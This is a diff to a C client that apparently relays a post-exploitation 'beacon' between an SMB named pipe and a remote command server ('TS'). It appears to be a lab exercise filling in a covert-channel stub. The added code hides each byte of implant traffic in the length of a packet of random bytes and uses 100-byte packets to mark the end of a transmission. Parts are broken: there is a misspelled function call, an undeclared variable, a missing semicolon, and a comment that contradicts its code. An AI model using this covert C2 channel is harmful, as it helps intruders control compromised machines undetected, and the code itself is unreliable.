@@ -165,6 +165,52 @@ void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
 }
 
 
+
+/**
+ *  This function decodes a packet's length into a byte.
+ *  @param payload: the string to decode the length of.
+ *  @return length(payload) % 256 if length(payload) % 256 > 128,
+ *          (length(payload) % 256) +  128 otherwise.
+ */ 
+unsigned char decode_length(char* payload) {
+    unsigned char payload_length = (char)(strlen(payload) % 256);
+    if (payload_length <= 128) {
+        payload_length += 128;
+    }
+    return payload_length;
+}
+
+
+/**
+ *  This function encodes a byte into a string of appropriate length.
+ *  @param byte: the byte to encode into the length of the string.
+ *  @return a pointer to the head of the payload string of appropriate length.
+ */ 
+char* encode_length(unsigned char byte) {
+    char* payload_str = malloc((int)byte);
+    unsigned char i = 0;
+    for (i = 0; i < byte; i++) {
+        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
+    }
+    return payload_str;
+}
+
+/**
+ *  This function generates a 100-byte end transmission string.
+ *  @return a pointer to the head of the 100-byte end transmission string.
+ */ 
+char* encode_end_transmission(unsigned char byte) {
+    char* payload_str = malloc(100);
+    unsigned char i = 0;
+    for (i = 0; i < 100; i++) {
+        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
+    }
+    return payload_str;
+}
+
+
+
+
 /**
  * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
  *
@@ -178,6 +224,7 @@ void main(int argc, char* argv[])
 		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR]");
 		exit(1);
 	}
+	
 
 	// Disable crash messages
 	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
@@ -242,32 +289,61 @@ void main(int argc, char* argv[])
 		free(payload);
 		exit(1);
 	}
-
+	// pointer to payload strings 
+	char* random_line = NULL;
+	DWORD byte_counter = 0;
+	unsigned char byte = 0;
+	// The pipe dance
 	while (1) {
-		// Start the pipe dance
+		// Read frame
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
 		if (read_size < 0)
 		{
 			printf("read_frame error, exiting\n");
 			break;
 		}
+
+		//Send data to receiver, 1 byte per packet
 		printf("Recv %d bytes from beacon\n", read_size);
-		//TODO - ADD YOUR COVERT CHANNEL CODE HERE
+		for (byte_counter = 0; byte_counter < read_size; byte_counter++) {
+			byte = (unsigned char) *(buffer + byte_counter);
+			random_line = encode_length(byte);
+			sendData(sockfd, random_line, (DWORD) byte);
+			free(random_line);
+		}
 		
-		sendData(sockfd, buffer, read_size);
+		//Send "End Transmission" 100 byte packet
+		random_line = enncode_end_transmission();
+		sendData(sockfd, random_line, 100);
+		free(random_line);
+
 		printf("Sent to TS\n");
 		
-		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
-		if (read_size < 0)
-		{
-			printf("recvData error, exiting\n");
-			break;
-		}
-		printf("Recv %d bytes from TS\n", read_size);
 
-		write_frame(beaconPipe, buffer, read_size);
+		//TODO - receiving. How do either the sender or receiver know when the other has finished sending data? 
+		//TODO - likely answer: send a packet 100 bytes long. 
+
+		random_line = malloc(512*sizeof(unsigned char));
+		byte_count = 0;
+		read_size = recvData(sockfd, random_line, BUFFER_MAX_SIZE);
+		while (read_size != 100 && byte_count < 512) {
+			if (read_size < 0)
+			{
+				printf("recvData error, exiting\n");
+				break;
+			}
+			buffer[byte_count] = decode_length(random_line); //TODO - this is a touch inefficient. Maybe change it to just work with read_size?
+			byte_count++;
+			read_size = recvData(sockfd, random_line, BUFFER_MAX_SIZE);
+			
+		}
+		printf("Recv %d bytes from TS\n", byte_count);
+		free(random_line);
+		write_frame(beaconPipe, buffer, byte_count);
 		printf("Sent to beacon\n");
 	}
+	//Free all allocated memory and close all memory leaks 
+	free(random_line)
 	free(payload);
 	free(buffer);
 	closesocket(sockfd);
